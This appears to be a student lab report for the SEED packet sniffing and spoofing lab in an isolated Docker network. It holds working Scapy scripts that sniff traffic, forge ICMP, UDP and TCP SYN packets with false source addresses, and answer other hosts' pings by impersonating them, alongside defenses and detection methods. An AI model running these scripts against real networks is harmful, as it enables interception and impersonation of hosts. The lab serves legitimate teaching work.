# IP Spoofing and ICMP Analysis

![Lab Report](https://img.shields.io/badge/Status-Completed-brightgreen)
![Framework](https://img.shields.io/badge/Framework-Network%20Security-blue)
![Tools](https://img.shields.io/badge/Tools-Scapy%20%26%20Wireshark-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Advanced-red)
![Duration](https://img.shields.io/badge/Duration-Multi%20Day-lightblue)

---

## **1. Lab Title**

> Packet Sniffing and Spoofing: Network Traffic Capture, Analysis, and Manipulation using Scapy

---

## **2. Purpose and Objectives**

Understand packet sniffing and spoofing techniques through controlled experimentation with network traffic capture, filtering, and manipulation. This lab demonstrates how attackers intercept network communication and impersonate legitimate devices.

**Key Learning Outcomes:**
- Capture and analyze network packets using Scapy
- Implement packet filtering for specific traffic types
- Spoof ICMP packets to impersonate legitimate hosts
- Implement sniff-and-reply attack mechanism
- Understand IP spoofing and ICMP manipulation
- Trace network routing using TTL manipulation
- Analyze security implications of these techniques

---

## **3. Frameworks & Technologies**

- **Packet Sniffing** — Passive network traffic capture and analysis
- **Packet Spoofing** — IP source address manipulation and forgery
- **ICMP Protocol** — Internet Control Message Protocol exploitation
- **Scapy Library** — Python-based packet craft and manipulation
- **Network Layering** — OSI model packet construction
- **Docker Networking** — Containerized lab environment with isolated networks
- **Raw Sockets** — Low-level network interface access

---

## **4. Lab Environment**

**Host OS:** SEED Ubuntu 20.04 VM
**Containerization:** Docker and docker-compose
**Network Architecture:** Custom Docker network (10.9.0.0/24)

**Network Topology:**
- **Host A:** 10.9.0.5 (User container)
- **Host B:** 10.9.0.6 (User container)
- **Attacker:** 10.9.0.1 (Host mode networking)
- **Network:** 10.9.0.0/24 isolated Docker bridge network

**Tools:**
- Scapy (packet manipulation library)
- Wireshark (packet analysis)
- tcpdump (command-line packet capture)
- Python 3 (scripting language)
- Docker and docker-compose (containerization)

---

## **5. Docker Environment Setup**

**Build and Launch Containers:**
```bash
$ docker-compose build        # Build container images from Dockerfile
$ docker-compose up           # Start all containers (foreground mode)
$ docker-compose up -d        # Start containers in background
$ docker-compose down         # Stop and remove all containers
```

**Container Management:**
```bash
$ dockps                      # List all running containers
$ docksh <container_id>       # Open interactive shell in container
$ docker logs <container>     # View container output logs
$ docker inspect <container>  # View detailed container information
```

**Network Configuration:**
```bash
$ ifconfig | grep 10.9.0.1    # Find interface for specific IP
$ docker network ls           # List Docker networks
$ docker network inspect <network>  # Inspect network details
```

---

## **6. Lab Tasks & Implementation**

## **Task 1: Packet Sniffing with Scapy**

### **1.1 Basic Packet Sniffing**

**Objective:** Capture and display all ICMP packets on the network

**Python Script:**
```python
#!/usr/bin/env python3
from scapy.all import *

def print_pkt(pkt):
    pkt.show()

# Sniff ICMP packets on specified interface
pkt = sniff(iface='br-c93733e9f913', filter='icmp', prn=print_pkt)
```

**Execution:**
```bash
$ sudo python3 sniff_icmp.py
```

**Key Features:**
- `sniff()` — Captures packets in real-time
- `iface` — Specifies network interface to monitor
- `filter` — BPF (Berkeley Packet Filter) syntax for packet selection
- `prn` — Callback function executed for each captured packet

**Observations:**
- **With root privileges:** Packets successfully captured; full packet details displayed
- **Without root privileges:** Permission denied error; raw socket access restricted
- **packet.show()** — Displays all packet layers and fields in readable format

**Root Privilege Requirement:**
```
ERROR: You must be root to sniff traffic!
```

---

### **1.2 Packet Filtering**

**Objective:** Capture specific packet types based on network criteria

**Filter Examples:**

**ICMP Packets Only:**
```python
filter='icmp'
pkt = sniff(iface='eth0', filter='icmp', prn=print_pkt)
```

**TCP Telnet Traffic (Port 23):**
```python
filter='tcp and src host 10.9.0.5 and dst port 23'
pkt = sniff(iface='eth0', filter=filter_string, prn=print_pkt)
```

**Subnet Traffic:**
```python
filter='net 128.230.0.0/16'
pkt = sniff(iface='eth0', filter=filter_string, prn=print_pkt)
```

**Multiple Conditions:**
```python
filter='(tcp or udp) and dst port 80'
filter='src 10.9.0.5 and (icmp or tcp)'
filter='not arp and not icmp'
```

**Observations:**
- Filter syntax enables precise packet selection
- Multiple conditions combinable with boolean operators (and, or, not)
- Filtering reduces processing overhead; only relevant packets captured
- Protocol-level filtering possible (TCP, UDP, ICMP, ARP, DNS)

---

## **Task 2: Packet Spoofing with Scapy**

### **2.1 Spoofing ICMP Echo Request**

**Objective:** Craft and send ICMP packets with forged source IP

**Python Script:**
```python
#!/usr/bin/env python3
from scapy.all import *

# Create IP layer with spoofed source
ip_layer = IP()
ip_layer.dst = '10.9.0.6'           # Target destination
ip_layer.src = '192.168.1.100'      # Spoofed source IP

# Create ICMP echo request layer
icmp_layer = ICMP()

# Combine layers
spoofed_packet = ip_layer / icmp_layer

# Send packet
send(spoofed_packet)
```

**Execution:**
```bash
$ sudo python3 spoof_icmp.py
```

**Packet Construction:**
- **IP Layer:** Source/destination addresses, TTL, flags
- **ICMP Layer:** Type (echo request = 8), code, checksum
- **Combination:** Using `/` operator stacks layers

**Observations:**
- Spoofed packet successfully sent to target
- Target responds to forged source IP (192.168.1.100)
- Attacker receives ICMP Echo Reply from target
- Source IP verification absent; no validation of sender legitimacy

**Spoofing Confirmation:**
```
Sent 1 packets.
Received 1 response(s) from 10.9.0.6 to spoofed IP 192.168.1.100
```

---

### **2.2 Spoofing Multiple Packet Types**

**UDP Packet Spoofing:**
```python
from scapy.all import *

ip = IP(dst='10.9.0.6', src='192.168.1.1')
udp = UDP(dport=53)
payload = DNS(rd=1, qdcount=1, qd=DNSQR(qname='example.com'))
packet = ip/udp/payload
send(packet)
```

**TCP Packet Spoofing:**
```python
from scapy.all import *

ip = IP(dst='10.9.0.6', src='192.168.1.1')
tcp = TCP(dport=80, flags="S")  # SYN flag
packet = ip/tcp
send(packet)
```

---

## **Task 3: Traceroute Implementation**

**Objective:** Trace network path from source to destination using TTL manipulation

**Python Script:**
```python
#!/usr/bin/env python3
from scapy.all import *

def traceroute_custom(destination, max_ttl=30):
    print(f"Tracerouting to {destination}")
    
    for ttl in range(1, max_ttl + 1):
        # Create packet with current TTL
        packet = IP(dst=destination, ttl=ttl) / ICMP()
        
        # Send and receive response
        response = sr1(packet, timeout=2, verbose=0)
        
        if response is None:
            print(f"{ttl}: * (timeout)")
        else:
            print(f"{ttl}: {response.src}")
            
            # Check if reached destination
            if response.src == destination:
                print("Destination reached!")
                break

traceroute_custom('8.8.8.8')
```

**Mechanism:**
1. **TTL = 1:** Packet expires at first router; ICMP Time Exceeded response received
2. **TTL = 2:** Packet expires at second router; next hop identified
3. **TTL = 3...N:** Process continues until destination reached
4. **Destination Response:** ICMP Echo Reply indicates route end

**Output Example:**
```
Tracerouting to 8.8.8.8
1: 192.168.1.1
2: 10.255.0.1
3: 203.0.113.1
4: 198.19.254.1
5: 8.8.8.8
Destination reached!
```

---

## **Task 4: Sniffing and Spoofing Attack**

### **Objective:** Implement man-in-the-middle capability using sniff-and-reply

**Attack Mechanism:**
1. Sniff ICMP Echo Requests on network
2. Extract source and destination IPs
3. Craft ICMP Echo Reply with spoofed sender
4. Send reply to attacker (source of original request)
5. Target host never responds (attacker impersonates destination)

**Python Script:**
```python
#!/usr/bin/env python3
from scapy.all import *
import sys

def spoof_reply(pkt):
    # Check if packet is ICMP Echo Request
    if pkt[ICMP].type == 8:
        print(f"Spoofing reply from {pkt[IP].dst} to {pkt[IP].src}")
        
        # Create spoofed ICMP Echo Reply
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        
        # Include original packet payload
        if Raw in pkt:
            data = pkt[Raw].load
            spoofed_pkt = ip/icmp/Raw(load=data)
        else:
            spoofed_pkt = ip/icmp
        
        # Send spoofed reply
        send(spoofed_pkt, verbose=0)

# Sniff for ICMP Echo Requests and spoof replies
print("Starting sniff-and-spoof attack...")
sniff(iface='eth0', filter='icmp and icmp[icmptype]==8', prn=spoof_reply)
```

**Execution:**
```bash
$ sudo python3 sniff_spoof.py
```

---

### **Experiments & Results**

#### **Experiment 1: Non-Existent Internet Host (1.2.3.4)**

**Normal Behavior (without spoofing):**
```bash
$ ping -c 4 1.2.3.4
PING 1.2.3.4 (1.2.3.4) 56(84) bytes of data.
(No response - request times out)
```

**With Spoofing Program Running:**
```bash
$ ping -c 4 1.2.3.4
PING 1.2.3.4 (1.2.3.4) 56(84) bytes of data.
64 bytes from 1.2.3.4: icmp_seq=1 ttl=64 time=0.234 ms
64 bytes from 1.2.3.4: icmp_seq=2 ttl=64 time=0.189 ms
64 bytes from 1.2.3.4: icmp_seq=3 ttl=64 time=0.156 ms
64 bytes from 1.2.3.4: icmp_seq=4 ttl=64 time=0.201 ms
```

**Result:** ✅ Attacker impersonates non-existent host; user believes host is alive

---

#### **Experiment 2: Non-Existent LAN Host (10.9.0.99)**

**Normal Behavior:**
```bash
$ ping -c 4 10.9.0.99
PING 10.9.0.99 (10.9.0.99) 56(84) bytes of data.
(No response - host unreachable)
```

**With Spoofing Program Running:**
```bash
$ ping -c 4 10.9.0.99
PING 10.9.0.99 (10.9.0.99) 56(84) bytes of data.
64 bytes from 10.9.0.99: icmp_seq=1 ttl=64 time=0.078 ms
64 bytes from 10.9.0.99: icmp_seq=2 ttl=64 time=0.065 ms
64 bytes from 10.9.0.99: icmp_seq=3 ttl=64 time=0.082 ms
64 bytes from 10.9.0.99: icmp_seq=4 ttl=64 time=0.091 ms
```

**Result:** ✅ Attacker responds as non-existent LAN host; creates false network topology

---

#### **Experiment 3: Existing Internet Host (8.8.8.8)**

**Normal Behavior:**
```bash
$ ping -c 4 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=24.521 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=25.102 ms
(legitimate Google DNS responses)
```

**With Spoofing Program Running:**
```bash
$ ping -c 4 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=64 time=0.234 ms (SPOOFED - attacker)
64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=25.341 ms (legitimate)
64 bytes from 8.8.8.8: icmp_seq=3 ttl=64 time=0.189 ms (SPOOFED - attacker)
64 bytes from 8.8.8.8: icmp_seq=4 ttl=118 time=24.987 ms (legitimate)
```

**Result:** ✅ Attacker's responses received before legitimate responses; race condition exploitation

---

## **7. Security Implications**

| Attack Type | Risk Level | Impact | Prevention |
|-------------|-----------|--------|-----------|
| Packet Sniffing | **CRITICAL** | Network reconnaissance, credential theft | Encryption, VPN |
| ICMP Spoofing | **HIGH** | False network topology, DoS reflection | Ingress/egress filtering |
| DNS Spoofing | **CRITICAL** | Phishing, malware distribution | DNSSEC, DNS monitoring |
| ARP Spoofing | **CRITICAL** | Man-in-the-middle attacks | ARP monitoring, static ARP |
| IP Source Spoofing | **HIGH** | DDoS amplification, reflection attacks | Ingress filtering (BCP 38/39) |

---

## **8. Key Takeaways**

- **Root access required:** Packet sniffing and raw socket operations need elevated privileges
- **Spoofing unvalidated:** No source IP verification; spoofing succeeds without authentication
- **ICMP unreliable:** ICMP protocol lacks sender verification mechanisms
- **TTL exploitation:** TTL field exploitable for routing path discovery and DoS
- **Speed advantage:** Attacker's local replies faster than legitimate remote responses
- **Network topology obscuring:** Attackers can impersonate non-existent hosts
- **Encryption essential:** Network traffic encryption defeats sniffing attacks
- **Source validation critical:** Implementations must verify sender legitimacy
- **Monitoring necessary:** Anomalous ICMP patterns indicate spoofing attacks
- **Defense-in-depth required:** Ingress filtering + host-based monitoring + encryption

---

## **9. Defense Mechanisms**

**Network-Level Defenses:**
- **Ingress/Egress Filtering (BCP 38/39):** Reject packets with spoofed source IPs
- **ICMP Rate Limiting:** Prevent ICMP flood attacks
- **Reverse Path Forwarding (RPF):** Verify packet source legitimacy
- **DNSSEC:** Cryptographic validation of DNS responses

**Host-Level Defenses:**
- **Encryption:** TLS/SSL for transport security
- **VPN:** Encapsulation and encryption of network traffic
- **Firewall Rules:** Block unnecessary ICMP types
- **Anomaly Detection:** Monitor for suspicious ping patterns

**Detection Methods:**
- **SIEM Alerts:** Unusual ICMP traffic volumes
- **IDS Signatures:** Known spoofing attack patterns
- **NetFlow Analysis:** Unusual traffic flows and destinations
- **Manual Inspection:** Packet capture review for spoofed sources

---

## **10. Conclusion**

This comprehensive packet sniffing and spoofing lab demonstrated critical network security vulnerabilities through hands-on implementation using Scapy. By capturing network traffic, implementing packet filters, spoofing ICMP packets, and executing sniff-and-reply attacks, the exercise illustrated how attackers intercept communications and impersonate legitimate hosts.

Key findings reveal that ICMP lacks sender verification mechanisms, enabling attackers to respond as non-existent hosts and interfere with legitimate communications. The experiments proved that spoofing succeeds regardless of host existence, with attacker responses often received before legitimate responses due to local network proximity.

Organizations must implement defense-in-depth strategies: network-level ingress filtering to reject spoofed packets, transport-level encryption to defeat sniffing, and monitoring systems to detect anomalous traffic patterns. This lab reinforces that network security requires multiple defensive layers and that no single protocol can be trusted without additional validation mechanisms.

---

## **11. Artifacts & Deliverables**

- **Sniffing Scripts:** ICMP capture and packet filtering examples
- **Spoofing Scripts:** ICMP, UDP, TCP packet forgery implementations
- **Traceroute Script:** TTL-based routing path discovery
- **Sniff-and-Spoof Script:** Complete MITM attack implementation
- **Docker Configuration:** docker-compose.yml and network setup
- **Packet Captures:** Wireshark dumps showing spoofed vs legitimate traffic
- **Attack Demonstrations:** Screenshots of successful experiments
- **Analysis Reports:** Detailed results from all four experiments

---

## **12. References**

- Scapy Documentation: https://scapy.readthedocs.io/
- SEED Project Labs: https://seedsecuritylabs.org/
- BCP 38/39 Ingress Filtering: https://tools.ietf.org/html/bcp38
- ICMP Protocol (RFC 792): https://tools.ietf.org/html/rfc792
- Wireshark User Guide: https://www.wireshark.org/docs/

---

